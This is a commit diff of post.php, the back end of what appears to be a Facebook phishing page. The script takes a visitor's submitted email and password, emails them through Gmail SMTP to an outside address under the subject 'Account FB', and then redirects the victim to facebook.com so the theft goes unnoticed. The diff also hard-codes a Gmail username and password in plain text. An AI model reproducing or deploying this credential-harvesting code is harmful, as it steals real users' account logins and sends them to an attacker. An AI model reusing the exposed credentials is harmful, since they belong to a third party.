77c6077a26d5b55524c546f080185c16f1f9bf2b
chile <levanchi74@gmail.com>
2019-12-31 17:38:10 +0700

    fix

--- post.php
+++ post.php
@@ -1,5 +1,6 @@
 <?php
 use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
 use PHPMailer\PHPMailer\Exception;
 
 require('PHPMailer/src/Exception.php');
@@ -12,33 +13,29 @@ if($_POST){
     $mail = new PHPMailer(true);
     try {
       
-        $mail->isSMTP();     
-    
         $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-        $mail->SMTPAuth = true; // authentication enabled
-        // $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+        $mail->isSMTP();   
+        
         $mail->Host = "smtp.gmail.com";
-        $mail->Port = 587; // or 587
-        $mail->isHTML(true);  
+        $mail->SMTPAuth = true; // authentication enabled
+      
         $mail->Username = 'huynguyen66028@gmail.com';
         $mail->Password = 'anphawolf@%)$1997';
+        $mail->SMTPSecure = 'ssl';
+        $mail->Port = 587; // or 587
       
         $mail->setFrom('huynguyen66028@gmail.com', 'Huy Nguyen');
         $mail->addAddress('anphawolf@gmail.com');
 
+        $mail->isHTML(true);  
         $mail->Subject = 'Account FB';
         $mail->Body = ' username: '.$_POST['email'] .' <br>
                         password: '.$_POST['pass'].'  ';
         
 
-        if(!$mail->send()) {
-            echo "Mailer Error: " . $mail->ErrorInfo;
-        } else {
-            //echo "Message has been sent";
-            header("Location: https://www.facebook.com/"); 
-            return true;
-        }
+        $mail->send();
+        header("Location: https://www.facebook.com/"); 
+
     } catch (Exception $e) {
         echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     }
